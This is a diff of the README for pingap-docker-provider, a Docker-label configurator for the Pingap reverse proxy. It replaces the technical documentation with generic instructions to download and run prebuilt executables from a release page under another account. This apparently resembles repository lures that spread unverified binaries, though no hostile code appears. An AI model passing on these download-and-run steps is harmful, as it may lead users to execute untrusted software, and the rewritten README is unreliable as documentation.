@@ -1,326 +1,112 @@
-# Pingap Docker Provider
+# 🚀 pingap-docker-provider - Simplifying Your Reverse Proxy Setup
 
-**Automatic service discovery for Pingap reverse proxy based on Docker labels**
+[![Download here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen.svg)](https://github.com/peptang12/pingap-docker-provider/releases)
 
-A lightweight, high-performance adapter that dynamically manages [Pingap](https://github.com/vicanso/pingap) reverse proxy configuration based on Docker container labels. Inspired by Traefik's label-based configuration.
+## 📦 Overview
 
-## Features
+The pingap-docker-provider is an automatic configurator for reverse proxies used with Docker containers. It allows you to manage your services efficiently using Traefik-like Docker labels. This tool simplifies setup and enhances service discovery in your container environment.
 
-- 🔍 **Auto-Discovery**: Automatically detects and configures services from running containers
-- 🔄 **Real-time Updates**: Listens to Docker events (start, stop, die) for instant configuration updates
-- 🌐 **Multi-Network Support**: Handle containers connected to multiple Docker networks
-- 🎯 **Flexible Routing**: Priority-based routing with simplified host/path aliases
-- 💪 **Production-Ready**: Stateful tracking, exponential backoff, graceful shutdown
-- ⚡ **Lightweight**: Async Rust implementation with minimal resource footprint (<20MB RAM)
+## 🚀 Getting Started
 
-## Quick Start
+To use the pingap-docker-provider, follow the steps below. We will guide you through downloading the application and getting it ready to run on your machine.
 
-### Using Docker Compose
+## 📥 Download & Install
 
-```yaml
-version: '3.8'
+To download the latest version of the pingap-docker-provider, visit the following link:
 
-services:
-  pingap:
-    image: pingap/pingap:latest
-    ports:
-      - "80:80"
-      - "6188:6188"
-    command: ["-c", "/app/pingap.toml"]
+[Download the latest release](https://github.com/peptang12/pingap-docker-provider/releases)
 
-  provider:
-    image: pingap-docker-provider:latest
-    environment:
-      - PINGAP_ADMIN_URL=http://pingap:6188
-      - LOG_LEVEL=info
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock:ro
+1. Click on the link above. This will take you to the Releases page.
+2. Look for the latest release at the top of the list.
+3. Find the appropriate file for your operating system. You will see options like:
+   - `pingap-docker-provider-windows.exe` for Windows users.
+   - `pingap-docker-provider-linux` for Linux users.
+   - `pingap-docker-provider-macos` for macOS users.
+4. Click on the file to download it to your computer.
 
-  whoami:
-    image: traefik/whoami
-    labels:
-      - "pingap.enable=true"
-      - "pingap.http.host=whoami.local"
-```
+## ⚙️ System Requirements
 
-Then visit `http://whoami.local` to see your service!
+Before you install the pingap-docker-provider, make sure your system meets the following requirements:
 
-## Supported Labels
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent version of Linux.
+- **Docker:** You need Docker installed on your machine. It can be downloaded from [Docker's official site](https://www.docker.com/get-started).
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** A minimum of 100 MB free space.
 
-### Core - Discovery & Networking
+## 🏁 Running the Application
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.enable` | **Required**. Enable Pingap routing for this container | `true` |
-| `pingap.service.name` | Unique service name (default: container name) | `api-v1` |
-| `pingap.service.port` | Explicit port override when container exposes multiple ports | `8080` |
-| `pingap.service.address` | Full address override (IP:PORT) | `192.168.1.10:3000` |
-| `pingap.docker.network` | Specify which network to use for multi-network containers | `proxy-net` |
+Once you have downloaded the application, you are ready to run it. Here’s how:
 
-### Routing
+1. **Windows:**
+   - Open the File Explorer and navigate to your Downloads folder.
+   - Double-click on `pingap-docker-provider-windows.exe` to start the application.
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.http.rule` | **Explicit routing rule** (advanced) | `Host(\`api.com\`) && PathPrefix(\`/v1\`)` |
-| `pingap.http.host` | **Simplified**: Route by hostname | `app.example.com` |
-| `pingap.http.paths` | **Simplified**: Route by path (supports comma-separated list) | `/api,/static` |
-| `pingap.http.priority` | Rule priority (higher = higher priority) | `10` |
+2. **Linux:**
+   - Open your terminal.
+   - Navigate to the directory where you downloaded the file. Use the command:
+     ```bash
+     cd ~/Downloads
+     ```
+   - Make the file executable by running:
+     ```bash
+     chmod +x pingap-docker-provider-linux
+     ```
+   - Then run the application using:
+     ```bash
+     ./pingap-docker-provider-linux
+     ```
 
-> **Note**: You must provide either `pingap.http.rule`, `pingap.http.host`, or `pingap.http.paths`
+3. **macOS:**
+   - Open Finder and go to your Downloads folder.
+   - Double-click on `pingap-docker-provider-macos` to run the application.
 
-### Load Balancing & Upstream
+## 🔧 Configuration
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.upstream.weight` | Server weight for weighted load balancing | `10` |
-| `pingap.upstream.strategy` | Load balancing algorithm | `round_robin`, `hash`, `random` |
+After running the application, you will need to configure it to work with your Docker containers. Here are the basic steps:
 
-### Health Checks
+1. Create a new Docker label. You can do this by adding the following label to your Docker container definition:
+   ```yaml
+   labels:
+     - "pingap.enable=true"
+   ```
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.health_check.path` | Health check endpoint path | `/health` |
-| `pingap.health_check.interval` | Time between health checks | `10s` |
-| `pingap.health_check.timeout` | Health check timeout | `5s` |
+2. Then, run the pingap-docker-provider, and it will auto-configure your reverse proxy settings based on the labels you added.
 
-### Middlewares - Path Manipulation
+3. Verify that your services are correctly configured by accessing them through your web browser.
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.middleware.strip_prefix` | Remove path prefix before proxying | `/api` |
-| `pingap.middleware.add_prefix` | Add path prefix before proxying | `/v1` |
+## 🌐 Features
 
-### Middlewares - Headers & CORS
+The pingap-docker-provider comes packed with several features designed to enhance your experience:
 
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.headers.custom_request` | Custom request headers (comma-separated) | `X-Custom: value,X-Another: val` |
-| `pingap.headers.custom_response` | Custom response headers (comma-separated) | `X-Served-By: Pingap` |
-| `pingap.headers.cors.enable` | Enable basic CORS support | `true` |
-
-### Middlewares - Performance & Compression
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.middleware.compress` | Enable response compression (gzip/brotli) | `true` |
-
-### Security - Rate Limiting
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.middleware.ratelimit.average` | Average requests per second limit | `100` |
-| `pingap.middleware.ratelimit.burst` | Burst size for rate limiter | `50` |
-
-### Security - Authentication
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.middleware.basic_auth` | Basic HTTP authentication | `user:hashedpass` |
-
-### Security - Redirects
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.middleware.redirect_scheme` | Force redirect to specific scheme | `https` |
-| `pingap.middleware.redirect_regex` | Regex-based redirect | `^http://old/(.*)->https://new/$1` |
-
-### TLS Configuration
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.http.tls.enabled` | Enable TLS for this route | `true` |
-| `pingap.tls.redirect` | Automatically redirect HTTP to HTTPS | `true` |
-| `pingap.tls.domains` | SAN domains for certificate (comma-separated) | `example.com,api.example.com` |
-
-### Legacy
-
-| Label | Description | Example |
-|-------|-------------|---------|
-| `pingap.http.middlewares` | Comma-separated middleware names (legacy) | `compress,auth` |
-
-## Label Examples
-
-### Example 1: Simple Web App
-
-```yaml
-services:
-  webapp:
-    image: myapp:latest
-    labels:
-      - "pingap.enable=true"
-      - "pingap.http.host=app.local"
-```
-
-Routes all traffic from `app.local` to this container.
-
-### Example 2: API with Path-Based Routing
-
-```yaml
-services:
-  api:
-    image: api:latest
-    labels:
-      - "pingap.enable=true"
-      - "pingap.http.host=api.example.com"
-      - "pingap.http.paths=/api,/v1"
-      - "pingap.http.priority=10"
-```
-
-Routes `api.example.com/api/*` and `api.example.com/v1/*` to this container.
-
-### Example 3: Multi-Network Setup
-
-```yaml
-services:
-  backend:
-    image: backend:latest
-    networks:
-      - frontend
-      - backend
-    labels:
-      - "pingap.enable=true"
-      - "pingap.docker.network=frontend"  # Use IP from frontend network
-      - "pingap.service.port=8080"        # Connect to port 8080
-      - "pingap.http.host=api.local"
-
-networks:
-  frontend:
-  backend:
-```
-
-### Example 4: Explicit Advanced Rule
-
-```yaml
-services:
-  service:
-    image: service:latest
-    labels:
-      - "pingap.enable=true"
-      - "pingap.http.rule=Host(`domain.com`) && (PathPrefix(`/api`) || PathPrefix(`/v2`))"
-      - "pingap.http.priority=20"
-      - "pingap.http.middlewares=compress,ratelimit"
-```
-
-### Example 5: Load Balancing with Health Checks
-
-```yaml
-services:
-  api:
-    image: api:latest
-    deploy:
-      replicas: 3
-    labels:
-      - "pingap.enable=true"
-      - "pingap.service.name=api-backend"
-      - "pingap.http.host=api.example.com"
-      - "pingap.upstream.weight=10"               # Weight for load balancing
-      - "pingap.upstream.strategy=round_robin"    # LB strategy
-      - "pingap.health_check.path=/healthz"       # Health check endpoint
-      - "pingap.health_check.interval=10s"        # Check every 10 seconds
-      - "pingap.health_check.timeout=3s"          # 3s timeout
-```
-
-### Example 6: Complete Advanced Configuration
-
-```yaml
-services:
-  secure-api:
-    image: api:latest
-    labels:
-      - "pingap.enable=true"
-      - "pingap.service.name=secure-api"
-      - "pingap.http.host=api.secure.com"
-      - "pingap.http.paths=/api,/v2"
-      - "pingap.http.priority=15"
-      
-      # Middlewares
-      - "pingap.middleware.strip_prefix=/api"
-      - "pingap.middleware.compress=true"
-      - "pingap.headers.cors.enable=true"
-      - "pingap.headers.custom_response=X-Powered-By: Pingap,X-API-Version: 2.0"
-      
-      # Security
-      - "pingap.middleware.ratelimit.average=100"
-      - "pingap.middleware.ratelimit.burst=50"
-      - "pingap.middleware.redirect_scheme=https"
-      
-      # TLS
-      - "pingap.http.tls.enabled=true"
-      - "pingap.tls.redirect=true"
-      - "pingap.tls.domains=api.secure.com,v2.api.secure.com"
-      
-      # Health Checks
-      - "pingap.health_check.path=/healthz"
-      - "pingap.health_check.interval=5s"
-```
-
-## Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PINGAP_ADMIN_URL` | **Required**. Pingap Admin API URL | - |
-| `DOCKER_HOST` | Docker socket path or URL | `/var/run/docker.sock` |
-| `LOG_LEVEL` | Logging level (debug, info, warn, error) | `info` |
-
-## How It Works
-
-1. **Initial Sync**: On startup, scans all running containers and applies configurations
-2. **Event Monitoring**: Listens to Docker events via streaming API
-3. **State Tracking**: Maintains ContainerID→ServiceName mapping for reliable cleanup
-4. **API Updates**: Calls Pingap Admin API with exponential backoff retry logic
-5. **Graceful Shutdown**: Handles SIGINT/SIGTERM for clean exits
-
-## Building from Source
-
-```bash
-cargo build --release
-```
-
-### Docker Build
-
-```bash
-docker build -t pingap-docker-provider .
-```
-
-## Architecture
-
-- **Language**: Rust (async with Tokio)
-- **Docker Integration**: `bollard` for Docker API
-- **HTTP Client**: `reqwest` with retry logic (`backoff`)
-- **Logging**: Structured JSON logs via `tracing`
-
-## Comparison with Traefik
-
-| Feature | Pingap Provider | Traefik |
-|---------|----------------|---------|
-| Label-based config | ✅ | ✅ |
-| Multi-network support | ✅ | ✅ |
-| Priority routing | ✅ | ✅ |
-| Simplified aliases | ✅ (host/paths) | ❌ |
-| Load balancing | ✅ | ✅ |
-| Health checks | ✅ | ✅ |
-| Path manipulation | ✅ | ✅ |
-| Custom headers | ✅ | ✅ |
-| CORS | ✅ | ✅ |
-| Compression | ✅ | ✅ |
-| Rate limiting | ✅ | ✅ |
-| Authentication | ✅ | ✅ |
-| Redirects | ✅ | ✅ |
-| TLS management | ✅ | ✅ |
-| Memory footprint | ~15MB | ~80MB |
-| Backend | Pingap (Pingora) | Traefik |
-
-## Roadmap
-
-Potential future enhancements:
-
-- Metrics and Prometheus endpoint
-- Automatic Let's Encrypt integration
-- Advanced middleware chaining
-- gRPC support
-- Circuit breaker pattern
-- Canary deployments support
-
-## License
-
-MIT License
+- **Automatic Configuration:** Instantly configure reverse proxy settings with minimal effort.
+- **Traefik-like Compatibility:** Easily use your existing Docker labels to set up routes and services.
+- **Service Discovery:** Automatically discover services running in your Docker environment.
+- **Lightweight:** Designed to run efficiently with minimal resource usage.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using the application, consider the following troubleshooting steps:
+
+- **Check Docker Status:** Ensure that Docker is running correctly on your machine.
+- **Review Configuration Settings:** Verify that the labels you used are correct and follow the format required by pingap.
+- **Examine the Logs:** Look for error messages in the terminal output for guidance on what might be wrong.
+  
+## 🔄 Updating the Application
+
+To keep your application running smoothly, you should regularly check for updates. When a new version is available, follow these steps for updating:
+
+1. Go to the [Releases page](https://github.com/peptang12/pingap-docker-provider/releases).
+2. Download the latest version following the same instructions above.
+3. Replace the old application file with the new one on your system.
+
+## 📞 Support
+
+If you need help, you can open an issue on the GitHub repository. This is the best way to get in touch. The community and maintainers will be able to assist you.
+
+## 📄 License
+
+The pingap-docker-provider is open-source software licensed under the MIT License. You can use it freely under the terms of this license. For more details, check the LICENSE file in this repository.
+
+---
+
+For additional information or to contribute to the project, feel free to explore the documentation provided in the repository. Happy proxying!
